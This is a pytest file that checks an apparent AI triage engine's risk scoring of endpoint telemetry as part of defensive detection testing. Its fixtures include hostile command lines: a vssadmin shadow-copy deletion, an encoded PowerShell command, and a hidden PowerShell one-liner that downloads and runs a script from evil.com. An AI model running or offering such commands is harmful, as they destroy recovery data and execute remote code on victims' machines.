"""
Tests for Central AI Triage Engine & Password / Transfer Speed Rules
"""
import pytest
from backend.agents.ai_triage import AITriageEngine

def test_triage_benign_telemetry():
    engine = AITriageEngine()
    mock_telemetry = {
        "system_info": {"host_id": "test-workstation-1", "hostname": "WORKSTATION-01"},
        "flagged_processes": [],
        "active_sockets": []
    }

    res = engine.evaluate_telemetry(mock_telemetry)
    assert res["risk_score"] == 0
    assert res["risk_level"] == "LOW"
    assert res["user_valid"] is True
    assert res["false_positive_probability"] > 0.8

def test_triage_password_attempts_exceeded():
    engine = AITriageEngine()
    mock_telemetry = {
        "system_info": {"host_id": "test-workstation-pass", "hostname": "SALES-PC"},
        "login_metrics": {
            "failed_login_attempts": 5, # Exceeds limit of 3
            "max_allowed_attempts": 3
        },
        "flagged_processes": [],
        "active_sockets": []
    }

    res = engine.evaluate_telemetry(mock_telemetry)
    assert res["failed_logins"] == 5
    assert res["user_valid"] is False
    assert res["risk_score"] >= 70
    assert res["risk_level"] in ("HIGH", "CRITICAL")
    assert res["matched_rules"][0]["technique_id"] == "T1110"

def test_triage_high_speed_data_exfiltration():
    engine = AITriageEngine()
    mock_telemetry = {
        "system_info": {"host_id": "test-workstation-speed", "hostname": "R&D-LAPTOP"},
        "transfer_speeds": {
            "upload_speed_mbps": 120.5, # Spiked upload speed
            "download_speed_mbps": 10.0,
            "is_high_speed_exfiltration": True
        },
        "flagged_processes": [],
        "active_sockets": []
    }

    res = engine.evaluate_telemetry(mock_telemetry)
    assert res["upload_speed_mbps"] == 120.5
    assert res["user_valid"] is False
    assert res["risk_score"] >= 85
    assert res["risk_level"] == "CRITICAL"
    assert res["recommended_action"] == "BROADCAST_SOS_AND_ISOLATE_HOST"

def test_triage_ransomware_shadow_deletion():
    engine = AITriageEngine()
    mock_telemetry = {
        "system_info": {"host_id": "test-workstation-2", "hostname": "FINANCE-PC"},
        "flagged_processes": [
            {
                "pid": 4012,
                "name": "vssadmin.exe",
                "exe": "C:\\Windows\\System32\\vssadmin.exe",
                "cmdline": "vssadmin.exe Delete Shadows /All /Quiet",
                "is_flagged": True
            }
        ],
        "active_sockets": []
    }

    res = engine.evaluate_telemetry(mock_telemetry)
    assert res["risk_score"] >= 90
    assert res["risk_level"] == "CRITICAL"
    assert res["matched_rules_count"] >= 1
    assert res["matched_rules"][0]["technique_id"] == "T1490"

def test_triage_obfuscated_powershell():
    engine = AITriageEngine()
    mock_telemetry = {
        "system_info": {"host_id": "test-workstation-3", "hostname": "DEV-LAPTOP"},
        "flagged_processes": [
            {
                "pid": 5510,
                "name": "powershell.exe",
                "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "cmdline": "powershell.exe -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA...",
                "is_flagged": True
            }
        ],
        "active_sockets": []
    }

    res = engine.evaluate_telemetry(mock_telemetry)
    assert res["risk_score"] >= 75
    assert res["risk_level"] in ("HIGH", "CRITICAL")
    assert res["matched_rules"][0]["technique_id"] == "T1059"

def test_triage_macro_phishing_spawning():
    engine = AITriageEngine()
    mock_telemetry = {
        "system_info": {"host_id": "test-workstation-4", "hostname": "HR-DESK"},
        "flagged_processes": [
            {
                "pid": 8812,
                "name": "powershell.exe",
                "exe": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "cmdline": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
                "is_flagged": True
            }
        ],
        "active_sockets": []
    }

    res = engine.evaluate_telemetry(mock_telemetry)
    assert res["risk_score"] >= 85
    assert res["risk_level"] == "CRITICAL"
